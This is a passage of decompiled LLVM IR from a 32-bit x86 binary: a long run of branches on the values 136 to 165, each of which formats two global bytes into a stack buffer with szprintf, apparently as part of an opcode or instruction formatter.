  %v5_804b459 = call i32 @szprintf(i32 %v2_804b452, i32 ptrtoint ([14 x i8]* @global_var_8058c39.160 to i32), i32 %v1_804b443, i32 %v1_804b437)
  br label %dec_label_pc_804b461

dec_label_pc_804b461:                             ; preds = %dec_label_pc_804b42e, %dec_label_pc_804b437
  %v12_804b461 = icmp eq i32 %v11_8049ac4, 136
  %v1_804b468 = icmp eq i1 %v12_804b461, false
  br i1 %v1_804b468, label %dec_label_pc_804b494, label %dec_label_pc_804b46a

dec_label_pc_804b46a:                             ; preds = %dec_label_pc_804b461
  %v0_804b46a = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b46a = zext i8 %v0_804b46a to i32
  store i32 %v1_804b46a, i32* @edx, align 4
  %v0_804b476 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b476 = zext i8 %v0_804b476 to i32
  %v2_804b485 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b485, i32* @ebx, align 4
  %v5_804b48c = call i32 @szprintf(i32 %v2_804b485, i32 ptrtoint ([14 x i8]* @global_var_8058c47.161 to i32), i32 %v1_804b476, i32 %v1_804b46a)
  br label %dec_label_pc_804b494

dec_label_pc_804b494:                             ; preds = %dec_label_pc_804b461, %dec_label_pc_804b46a
  %v12_804b494 = icmp eq i32 %v11_8049ac4, 137
  %v1_804b49b = icmp eq i1 %v12_804b494, false
  br i1 %v1_804b49b, label %dec_label_pc_804b4c7, label %dec_label_pc_804b49d

dec_label_pc_804b49d:                             ; preds = %dec_label_pc_804b494
  %v0_804b49d = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b49d = zext i8 %v0_804b49d to i32
  store i32 %v1_804b49d, i32* @edx, align 4
  %v0_804b4a9 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b4a9 = zext i8 %v0_804b4a9 to i32
  %v2_804b4b8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4b8, i32* @ebx, align 4
  %v5_804b4bf = call i32 @szprintf(i32 %v2_804b4b8, i32 ptrtoint ([13 x i8]* @global_var_8058c55.162 to i32), i32 %v1_804b4a9, i32 %v1_804b49d)
  br label %dec_label_pc_804b4c7

dec_label_pc_804b4c7:                             ; preds = %dec_label_pc_804b494, %dec_label_pc_804b49d
  %v12_804b4c7 = icmp eq i32 %v11_8049ac4, 138
  %v1_804b4ce = icmp eq i1 %v12_804b4c7, false
  br i1 %v1_804b4ce, label %dec_label_pc_804b4fa, label %dec_label_pc_804b4d0

dec_label_pc_804b4d0:                             ; preds = %dec_label_pc_804b4c7
  %v0_804b4d0 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b4d0 = zext i8 %v0_804b4d0 to i32
  store i32 %v1_804b4d0, i32* @edx, align 4
  %v0_804b4dc = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b4dc = zext i8 %v0_804b4dc to i32
  %v2_804b4eb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4eb, i32* @ebx, align 4
  %v5_804b4f2 = call i32 @szprintf(i32 %v2_804b4eb, i32 ptrtoint ([13 x i8]* @global_var_8058c62.163 to i32), i32 %v1_804b4dc, i32 %v1_804b4d0)
  br label %dec_label_pc_804b4fa

dec_label_pc_804b4fa:                             ; preds = %dec_label_pc_804b4c7, %dec_label_pc_804b4d0
  %v12_804b4fa = icmp eq i32 %v11_8049ac4, 139
  %v1_804b501 = icmp eq i1 %v12_804b4fa, false
  br i1 %v1_804b501, label %dec_label_pc_804b52d, label %dec_label_pc_804b503

dec_label_pc_804b503:                             ; preds = %dec_label_pc_804b4fa
  %v0_804b503 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b503 = zext i8 %v0_804b503 to i32
  store i32 %v1_804b503, i32* @edx, align 4
  %v0_804b50f = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b50f = zext i8 %v0_804b50f to i32
  %v2_804b51e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b51e, i32* @ebx, align 4
  %v5_804b525 = call i32 @szprintf(i32 %v2_804b51e, i32 ptrtoint ([13 x i8]* @global_var_8058c6f.164 to i32), i32 %v1_804b50f, i32 %v1_804b503)
  br label %dec_label_pc_804b52d

dec_label_pc_804b52d:                             ; preds = %dec_label_pc_804b4fa, %dec_label_pc_804b503
  %v12_804b52d = icmp eq i32 %v11_8049ac4, 140
  %v1_804b534 = icmp eq i1 %v12_804b52d, false
  br i1 %v1_804b534, label %dec_label_pc_804b560, label %dec_label_pc_804b536

dec_label_pc_804b536:                             ; preds = %dec_label_pc_804b52d
  %v0_804b536 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b536 = zext i8 %v0_804b536 to i32
  store i32 %v1_804b536, i32* @edx, align 4
  %v0_804b542 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b542 = zext i8 %v0_804b542 to i32
  %v2_804b551 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b551, i32* @ebx, align 4
  %v5_804b558 = call i32 @szprintf(i32 %v2_804b551, i32 ptrtoint ([13 x i8]* @global_var_8058c7c.165 to i32), i32 %v1_804b542, i32 %v1_804b536)
  br label %dec_label_pc_804b560

dec_label_pc_804b560:                             ; preds = %dec_label_pc_804b52d, %dec_label_pc_804b536
  %v12_804b560 = icmp eq i32 %v11_8049ac4, 141
  %v1_804b567 = icmp eq i1 %v12_804b560, false
  br i1 %v1_804b567, label %dec_label_pc_804b593, label %dec_label_pc_804b569

dec_label_pc_804b569:                             ; preds = %dec_label_pc_804b560
  %v0_804b569 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b569 = zext i8 %v0_804b569 to i32
  store i32 %v1_804b569, i32* @edx, align 4
  %v0_804b575 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b575 = zext i8 %v0_804b575 to i32
  %v2_804b584 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b584, i32* @ebx, align 4
  %v5_804b58b = call i32 @szprintf(i32 %v2_804b584, i32 ptrtoint ([13 x i8]* @global_var_8058c89.166 to i32), i32 %v1_804b575, i32 %v1_804b569)
  br label %dec_label_pc_804b593

dec_label_pc_804b593:                             ; preds = %dec_label_pc_804b560, %dec_label_pc_804b569
  %v12_804b593 = icmp eq i32 %v11_8049ac4, 142
  %v1_804b59a = icmp eq i1 %v12_804b593, false
  br i1 %v1_804b59a, label %dec_label_pc_804b5c6, label %dec_label_pc_804b59c

dec_label_pc_804b59c:                             ; preds = %dec_label_pc_804b593
  %v0_804b59c = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b59c = zext i8 %v0_804b59c to i32
  store i32 %v1_804b59c, i32* @edx, align 4
  %v0_804b5a8 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b5a8 = zext i8 %v0_804b5a8 to i32
  %v2_804b5b7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5b7, i32* @ebx, align 4
  %v5_804b5be = call i32 @szprintf(i32 %v2_804b5b7, i32 ptrtoint ([13 x i8]* @global_var_8058c96.167 to i32), i32 %v1_804b5a8, i32 %v1_804b59c)
  br label %dec_label_pc_804b5c6

dec_label_pc_804b5c6:                             ; preds = %dec_label_pc_804b593, %dec_label_pc_804b59c
  %v12_804b5c6 = icmp eq i32 %v11_8049ac4, 143
  %v1_804b5cd = icmp eq i1 %v12_804b5c6, false
  br i1 %v1_804b5cd, label %dec_label_pc_804b5f9, label %dec_label_pc_804b5cf

dec_label_pc_804b5cf:                             ; preds = %dec_label_pc_804b5c6
  %v0_804b5cf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b5cf = zext i8 %v0_804b5cf to i32
  store i32 %v1_804b5cf, i32* @edx, align 4
  %v0_804b5db = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b5db = zext i8 %v0_804b5db to i32
  %v2_804b5ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5ea, i32* @ebx, align 4
  %v5_804b5f1 = call i32 @szprintf(i32 %v2_804b5ea, i32 ptrtoint ([14 x i8]* @global_var_8058bad.150 to i32), i32 %v1_804b5db, i32 %v1_804b5cf)
  br label %dec_label_pc_804b5f9

dec_label_pc_804b5f9:                             ; preds = %dec_label_pc_804b5c6, %dec_label_pc_804b5cf
  %v9_804b5f9 = icmp eq i32 %v11_8049ac4, 144
  %v1_804b600 = icmp eq i1 %v9_804b5f9, false
  br i1 %v1_804b600, label %dec_label_pc_804b62c, label %dec_label_pc_804b602

dec_label_pc_804b602:                             ; preds = %dec_label_pc_804b5f9
  %v0_804b602 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b602 = zext i8 %v0_804b602 to i32
  store i32 %v1_804b602, i32* @edx, align 4
  %v0_804b60e = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b60e = zext i8 %v0_804b60e to i32
  %v2_804b61d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b61d, i32* @ebx, align 4
  %v5_804b624 = call i32 @szprintf(i32 %v2_804b61d, i32 ptrtoint ([14 x i8]* @global_var_8058ca3.168 to i32), i32 %v1_804b60e, i32 %v1_804b602)
  br label %dec_label_pc_804b62c

dec_label_pc_804b62c:                             ; preds = %dec_label_pc_804b5f9, %dec_label_pc_804b602
  %v12_804b62c = icmp eq i32 %v11_8049ac4, 145
  %v1_804b633 = icmp eq i1 %v12_804b62c, false
  br i1 %v1_804b633, label %dec_label_pc_804b65f, label %dec_label_pc_804b635

dec_label_pc_804b635:                             ; preds = %dec_label_pc_804b62c
  %v0_804b635 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b635 = zext i8 %v0_804b635 to i32
  store i32 %v1_804b635, i32* @edx, align 4
  %v0_804b641 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b641 = zext i8 %v0_804b641 to i32
  %v2_804b650 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b650, i32* @ebx, align 4
  %v5_804b657 = call i32 @szprintf(i32 %v2_804b650, i32 ptrtoint ([14 x i8]* @global_var_8058cb1.169 to i32), i32 %v1_804b641, i32 %v1_804b635)
  br label %dec_label_pc_804b65f

dec_label_pc_804b65f:                             ; preds = %dec_label_pc_804b62c, %dec_label_pc_804b635
  %v12_804b65f = icmp eq i32 %v11_8049ac4, 146
  %v1_804b666 = icmp eq i1 %v12_804b65f, false
  br i1 %v1_804b666, label %dec_label_pc_804b692, label %dec_label_pc_804b668

dec_label_pc_804b668:                             ; preds = %dec_label_pc_804b65f
  %v0_804b668 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b668 = zext i8 %v0_804b668 to i32
  store i32 %v1_804b668, i32* @edx, align 4
  %v0_804b674 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b674 = zext i8 %v0_804b674 to i32
  %v2_804b683 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b683, i32* @ebx, align 4
  %v5_804b68a = call i32 @szprintf(i32 %v2_804b683, i32 ptrtoint ([14 x i8]* @global_var_8058cbf.170 to i32), i32 %v1_804b674, i32 %v1_804b668)
  br label %dec_label_pc_804b692

dec_label_pc_804b692:                             ; preds = %dec_label_pc_804b65f, %dec_label_pc_804b668
  %v12_804b692 = icmp eq i32 %v11_8049ac4, 147
  %v1_804b699 = icmp eq i1 %v12_804b692, false
  br i1 %v1_804b699, label %dec_label_pc_804b6c5, label %dec_label_pc_804b69b

dec_label_pc_804b69b:                             ; preds = %dec_label_pc_804b692
  %v0_804b69b = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b69b = zext i8 %v0_804b69b to i32
  store i32 %v1_804b69b, i32* @edx, align 4
  %v0_804b6a7 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b6a7 = zext i8 %v0_804b6a7 to i32
  %v2_804b6b6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6b6, i32* @ebx, align 4
  %v5_804b6bd = call i32 @szprintf(i32 %v2_804b6b6, i32 ptrtoint ([13 x i8]* @global_var_8058ccd.171 to i32), i32 %v1_804b6a7, i32 %v1_804b69b)
  br label %dec_label_pc_804b6c5

dec_label_pc_804b6c5:                             ; preds = %dec_label_pc_804b692, %dec_label_pc_804b69b
  %v12_804b6c5 = icmp eq i32 %v11_8049ac4, 148
  %v1_804b6cc = icmp eq i1 %v12_804b6c5, false
  br i1 %v1_804b6cc, label %dec_label_pc_804b6f8, label %dec_label_pc_804b6ce

dec_label_pc_804b6ce:                             ; preds = %dec_label_pc_804b6c5
  %v0_804b6ce = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b6ce = zext i8 %v0_804b6ce to i32
  store i32 %v1_804b6ce, i32* @edx, align 4
  %v0_804b6da = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b6da = zext i8 %v0_804b6da to i32
  %v2_804b6e9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6e9, i32* @ebx, align 4
  %v5_804b6f0 = call i32 @szprintf(i32 %v2_804b6e9, i32 ptrtoint ([13 x i8]* @global_var_8058cda.172 to i32), i32 %v1_804b6da, i32 %v1_804b6ce)
  br label %dec_label_pc_804b6f8

dec_label_pc_804b6f8:                             ; preds = %dec_label_pc_804b6c5, %dec_label_pc_804b6ce
  %v12_804b6f8 = icmp eq i32 %v11_8049ac4, 149
  %v1_804b6ff = icmp eq i1 %v12_804b6f8, false
  br i1 %v1_804b6ff, label %dec_label_pc_804b72b, label %dec_label_pc_804b701

dec_label_pc_804b701:                             ; preds = %dec_label_pc_804b6f8
  %v0_804b701 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b701 = zext i8 %v0_804b701 to i32
  store i32 %v1_804b701, i32* @edx, align 4
  %v0_804b70d = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b70d = zext i8 %v0_804b70d to i32
  %v2_804b71c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b71c, i32* @ebx, align 4
  %v5_804b723 = call i32 @szprintf(i32 %v2_804b71c, i32 ptrtoint ([14 x i8]* @global_var_8058ce7.173 to i32), i32 %v1_804b70d, i32 %v1_804b701)
  br label %dec_label_pc_804b72b

dec_label_pc_804b72b:                             ; preds = %dec_label_pc_804b6f8, %dec_label_pc_804b701
  %v12_804b72b = icmp eq i32 %v11_8049ac4, 150
  %v1_804b732 = icmp eq i1 %v12_804b72b, false
  br i1 %v1_804b732, label %dec_label_pc_804b75e, label %dec_label_pc_804b734

dec_label_pc_804b734:                             ; preds = %dec_label_pc_804b72b
  %v0_804b734 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b734 = zext i8 %v0_804b734 to i32
  store i32 %v1_804b734, i32* @edx, align 4
  %v0_804b740 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b740 = zext i8 %v0_804b740 to i32
  %v2_804b74f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b74f, i32* @ebx, align 4
  %v5_804b756 = call i32 @szprintf(i32 %v2_804b74f, i32 ptrtoint ([14 x i8]* @global_var_8058cf5.174 to i32), i32 %v1_804b740, i32 %v1_804b734)
  br label %dec_label_pc_804b75e

dec_label_pc_804b75e:                             ; preds = %dec_label_pc_804b72b, %dec_label_pc_804b734
  %v12_804b75e = icmp eq i32 %v11_8049ac4, 151
  %v1_804b765 = icmp eq i1 %v12_804b75e, false
  br i1 %v1_804b765, label %dec_label_pc_804b791, label %dec_label_pc_804b767

dec_label_pc_804b767:                             ; preds = %dec_label_pc_804b75e
  %v0_804b767 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b767 = zext i8 %v0_804b767 to i32
  store i32 %v1_804b767, i32* @edx, align 4
  %v0_804b773 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b773 = zext i8 %v0_804b773 to i32
  %v2_804b782 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b782, i32* @ebx, align 4
  %v5_804b789 = call i32 @szprintf(i32 %v2_804b782, i32 ptrtoint ([14 x i8]* @global_var_8058d03.175 to i32), i32 %v1_804b773, i32 %v1_804b767)
  br label %dec_label_pc_804b791

dec_label_pc_804b791:                             ; preds = %dec_label_pc_804b75e, %dec_label_pc_804b767
  %v12_804b791 = icmp eq i32 %v11_8049ac4, 152
  %v1_804b798 = icmp eq i1 %v12_804b791, false
  br i1 %v1_804b798, label %dec_label_pc_804b7c4, label %dec_label_pc_804b79a

dec_label_pc_804b79a:                             ; preds = %dec_label_pc_804b791
  %v0_804b79a = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b79a = zext i8 %v0_804b79a to i32
  store i32 %v1_804b79a, i32* @edx, align 4
  %v0_804b7a6 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b7a6 = zext i8 %v0_804b7a6 to i32
  %v2_804b7b5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7b5, i32* @ebx, align 4
  %v5_804b7bc = call i32 @szprintf(i32 %v2_804b7b5, i32 ptrtoint ([14 x i8]* @global_var_8058b34.141 to i32), i32 %v1_804b7a6, i32 %v1_804b79a)
  br label %dec_label_pc_804b7c4

dec_label_pc_804b7c4:                             ; preds = %dec_label_pc_804b791, %dec_label_pc_804b79a
  %v12_804b7c4 = icmp eq i32 %v11_8049ac4, 153
  %v1_804b7cb = icmp eq i1 %v12_804b7c4, false
  br i1 %v1_804b7cb, label %dec_label_pc_804b7f7, label %dec_label_pc_804b7cd

dec_label_pc_804b7cd:                             ; preds = %dec_label_pc_804b7c4
  %v0_804b7cd = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b7cd = zext i8 %v0_804b7cd to i32
  store i32 %v1_804b7cd, i32* @edx, align 4
  %v0_804b7d9 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b7d9 = zext i8 %v0_804b7d9 to i32
  %v2_804b7e8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7e8, i32* @ebx, align 4
  %v5_804b7ef = call i32 @szprintf(i32 %v2_804b7e8, i32 ptrtoint ([13 x i8]* @global_var_8058d11.176 to i32), i32 %v1_804b7d9, i32 %v1_804b7cd)
  br label %dec_label_pc_804b7f7

dec_label_pc_804b7f7:                             ; preds = %dec_label_pc_804b7c4, %dec_label_pc_804b7cd
  %v12_804b7f7 = icmp eq i32 %v11_8049ac4, 154
  %v1_804b7fe = icmp eq i1 %v12_804b7f7, false
  br i1 %v1_804b7fe, label %dec_label_pc_804b82a, label %dec_label_pc_804b800

dec_label_pc_804b800:                             ; preds = %dec_label_pc_804b7f7
  %v0_804b800 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b800 = zext i8 %v0_804b800 to i32
  store i32 %v1_804b800, i32* @edx, align 4
  %v0_804b80c = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b80c = zext i8 %v0_804b80c to i32
  %v2_804b81b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b81b, i32* @ebx, align 4
  %v5_804b822 = call i32 @szprintf(i32 %v2_804b81b, i32 ptrtoint ([13 x i8]* @global_var_8058d1e.177 to i32), i32 %v1_804b80c, i32 %v1_804b800)
  br label %dec_label_pc_804b82a

dec_label_pc_804b82a:                             ; preds = %dec_label_pc_804b7f7, %dec_label_pc_804b800
  %v12_804b82a = icmp eq i32 %v11_8049ac4, 155
  %v1_804b831 = icmp eq i1 %v12_804b82a, false
  br i1 %v1_804b831, label %dec_label_pc_804b85d, label %dec_label_pc_804b833

dec_label_pc_804b833:                             ; preds = %dec_label_pc_804b82a
  %v0_804b833 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b833 = zext i8 %v0_804b833 to i32
  store i32 %v1_804b833, i32* @edx, align 4
  %v0_804b83f = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b83f = zext i8 %v0_804b83f to i32
  %v2_804b84e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b84e, i32* @ebx, align 4
  %v5_804b855 = call i32 @szprintf(i32 %v2_804b84e, i32 ptrtoint ([13 x i8]* @global_var_8058d2b.178 to i32), i32 %v1_804b83f, i32 %v1_804b833)
  br label %dec_label_pc_804b85d

dec_label_pc_804b85d:                             ; preds = %dec_label_pc_804b82a, %dec_label_pc_804b833
  %v12_804b85d = icmp eq i32 %v11_8049ac4, 156
  %v1_804b864 = icmp eq i1 %v12_804b85d, false
  br i1 %v1_804b864, label %dec_label_pc_804b890, label %dec_label_pc_804b866

dec_label_pc_804b866:                             ; preds = %dec_label_pc_804b85d
  %v0_804b866 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b866 = zext i8 %v0_804b866 to i32
  store i32 %v1_804b866, i32* @edx, align 4
  %v0_804b872 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b872 = zext i8 %v0_804b872 to i32
  %v2_804b881 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b881, i32* @ebx, align 4
  %v5_804b888 = call i32 @szprintf(i32 %v2_804b881, i32 ptrtoint ([13 x i8]* @global_var_8058d38.179 to i32), i32 %v1_804b872, i32 %v1_804b866)
  br label %dec_label_pc_804b890

dec_label_pc_804b890:                             ; preds = %dec_label_pc_804b85d, %dec_label_pc_804b866
  %v12_804b890 = icmp eq i32 %v11_8049ac4, 157
  %v1_804b897 = icmp eq i1 %v12_804b890, false
  br i1 %v1_804b897, label %dec_label_pc_804b8c3, label %dec_label_pc_804b899

dec_label_pc_804b899:                             ; preds = %dec_label_pc_804b890
  %v0_804b899 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b899 = zext i8 %v0_804b899 to i32
  store i32 %v1_804b899, i32* @edx, align 4
  %v0_804b8a5 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b8a5 = zext i8 %v0_804b8a5 to i32
  %v2_804b8b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8b4, i32* @ebx, align 4
  %v5_804b8bb = call i32 @szprintf(i32 %v2_804b8b4, i32 ptrtoint ([13 x i8]* @global_var_8058d45.180 to i32), i32 %v1_804b8a5, i32 %v1_804b899)
  br label %dec_label_pc_804b8c3

dec_label_pc_804b8c3:                             ; preds = %dec_label_pc_804b890, %dec_label_pc_804b899
  %v12_804b8c3 = icmp eq i32 %v11_8049ac4, 158
  %v1_804b8ca = icmp eq i1 %v12_804b8c3, false
  br i1 %v1_804b8ca, label %dec_label_pc_804b8f6, label %dec_label_pc_804b8cc

dec_label_pc_804b8cc:                             ; preds = %dec_label_pc_804b8c3
  %v0_804b8cc = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b8cc = zext i8 %v0_804b8cc to i32
  store i32 %v1_804b8cc, i32* @edx, align 4
  %v0_804b8d8 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b8d8 = zext i8 %v0_804b8d8 to i32
  %v2_804b8e7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8e7, i32* @ebx, align 4
  %v5_804b8ee = call i32 @szprintf(i32 %v2_804b8e7, i32 ptrtoint ([12 x i8]* @global_var_8058d52.181 to i32), i32 %v1_804b8d8, i32 %v1_804b8cc)
  br label %dec_label_pc_804b8f6

dec_label_pc_804b8f6:                             ; preds = %dec_label_pc_804b8c3, %dec_label_pc_804b8cc
  %v12_804b8f6 = icmp eq i32 %v11_8049ac4, 159
  %v1_804b8fd = icmp eq i1 %v12_804b8f6, false
  br i1 %v1_804b8fd, label %dec_label_pc_804b929, label %dec_label_pc_804b8ff

dec_label_pc_804b8ff:                             ; preds = %dec_label_pc_804b8f6
  %v0_804b8ff = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b8ff = zext i8 %v0_804b8ff to i32
  store i32 %v1_804b8ff, i32* @edx, align 4
  %v0_804b90b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b90b = zext i8 %v0_804b90b to i32
  %v2_804b91a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b91a, i32* @ebx, align 4
  %v5_804b921 = call i32 @szprintf(i32 %v2_804b91a, i32 ptrtoint ([14 x i8]* @global_var_8058d5e.182 to i32), i32 %v1_804b90b, i32 %v1_804b8ff)
  br label %dec_label_pc_804b929

dec_label_pc_804b929:                             ; preds = %dec_label_pc_804b8f6, %dec_label_pc_804b8ff
  %v9_804b929 = icmp eq i32 %v11_8049ac4, 160
  %v1_804b930 = icmp eq i1 %v9_804b929, false
  br i1 %v1_804b930, label %dec_label_pc_804b95c, label %dec_label_pc_804b932

dec_label_pc_804b932:                             ; preds = %dec_label_pc_804b929
  %v0_804b932 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b932 = zext i8 %v0_804b932 to i32
  store i32 %v1_804b932, i32* @edx, align 4
  %v0_804b93e = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b93e = zext i8 %v0_804b93e to i32
  %v2_804b94d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b94d, i32* @ebx, align 4
  %v5_804b954 = call i32 @szprintf(i32 %v2_804b94d, i32 ptrtoint ([13 x i8]* @global_var_8058d6c.183 to i32), i32 %v1_804b93e, i32 %v1_804b932)
  br label %dec_label_pc_804b95c

dec_label_pc_804b95c:                             ; preds = %dec_label_pc_804b929, %dec_label_pc_804b932
  %v12_804b95c = icmp eq i32 %v11_8049ac4, 161
  %v1_804b963 = icmp eq i1 %v12_804b95c, false
  br i1 %v1_804b963, label %dec_label_pc_804b98f, label %dec_label_pc_804b965

dec_label_pc_804b965:                             ; preds = %dec_label_pc_804b95c
  %v0_804b965 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b965 = zext i8 %v0_804b965 to i32
  store i32 %v1_804b965, i32* @edx, align 4
  %v0_804b971 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b971 = zext i8 %v0_804b971 to i32
  %v2_804b980 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b980, i32* @ebx, align 4
  %v5_804b987 = call i32 @szprintf(i32 %v2_804b980, i32 ptrtoint ([14 x i8]* @global_var_8058d79.184 to i32), i32 %v1_804b971, i32 %v1_804b965)
  br label %dec_label_pc_804b98f

dec_label_pc_804b98f:                             ; preds = %dec_label_pc_804b95c, %dec_label_pc_804b965
  %v12_804b98f = icmp eq i32 %v11_8049ac4, 162
  %v1_804b996 = icmp eq i1 %v12_804b98f, false
  br i1 %v1_804b996, label %dec_label_pc_804b9c2, label %dec_label_pc_804b998

dec_label_pc_804b998:                             ; preds = %dec_label_pc_804b98f
  %v0_804b998 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b998 = zext i8 %v0_804b998 to i32
  store i32 %v1_804b998, i32* @edx, align 4
  %v0_804b9a4 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b9a4 = zext i8 %v0_804b9a4 to i32
  %v2_804b9b3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9b3, i32* @ebx, align 4
  %v5_804b9ba = call i32 @szprintf(i32 %v2_804b9b3, i32 ptrtoint ([14 x i8]* @global_var_8058d87.185 to i32), i32 %v1_804b9a4, i32 %v1_804b998)
  br label %dec_label_pc_804b9c2

dec_label_pc_804b9c2:                             ; preds = %dec_label_pc_804b98f, %dec_label_pc_804b998
  %v12_804b9c2 = icmp eq i32 %v11_8049ac4, 163
  %v1_804b9c9 = icmp eq i1 %v12_804b9c2, false
  br i1 %v1_804b9c9, label %dec_label_pc_804b9f5, label %dec_label_pc_804b9cb

dec_label_pc_804b9cb:                             ; preds = %dec_label_pc_804b9c2
  %v0_804b9cb = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b9cb = zext i8 %v0_804b9cb to i32
  store i32 %v1_804b9cb, i32* @edx, align 4
  %v0_804b9d7 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804b9d7 = zext i8 %v0_804b9d7 to i32
  %v2_804b9e6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9e6, i32* @ebx, align 4
  %v5_804b9ed = call i32 @szprintf(i32 %v2_804b9e6, i32 ptrtoint ([14 x i8]* @global_var_8058d95.186 to i32), i32 %v1_804b9d7, i32 %v1_804b9cb)
  br label %dec_label_pc_804b9f5

dec_label_pc_804b9f5:                             ; preds = %dec_label_pc_804b9c2, %dec_label_pc_804b9cb
  %v12_804b9f5 = icmp eq i32 %v11_8049ac4, 164
  %v1_804b9fc = icmp eq i1 %v12_804b9f5, false
  br i1 %v1_804b9fc, label %dec_label_pc_804ba28, label %dec_label_pc_804b9fe

dec_label_pc_804b9fe:                             ; preds = %dec_label_pc_804b9f5
  %v0_804b9fe = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804b9fe = zext i8 %v0_804b9fe to i32
  store i32 %v1_804b9fe, i32* @edx, align 4
  %v0_804ba0a = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ba0a = zext i8 %v0_804ba0a to i32
  %v2_804ba19 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba19, i32* @ebx, align 4
  %v5_804ba20 = call i32 @szprintf(i32 %v2_804ba19, i32 ptrtoint ([14 x i8]* @global_var_8058d03.175 to i32), i32 %v1_804ba0a, i32 %v1_804b9fe)
  br label %dec_label_pc_804ba28

dec_label_pc_804ba28:                             ; preds = %dec_label_pc_804b9f5, %dec_label_pc_804b9fe
  %v12_804ba28 = icmp eq i32 %v11_8049ac4, 165
  %v1_804ba2f = icmp eq i1 %v12_804ba28, false
  br i1 %v1_804ba2f, label %dec_label_pc_804ba5b, label %dec_label_pc_804ba31

dec_label_pc_804ba31:                             ; preds = %dec_label_pc_804ba28
  %v0_804ba31 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ba31 = zext i8 %v0_804ba31 to i32
  store i32 %v1_804ba31, i32* @edx, align 4
  %v0_804ba3d = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ba3d = zext i8 %v0_804ba3d to i32
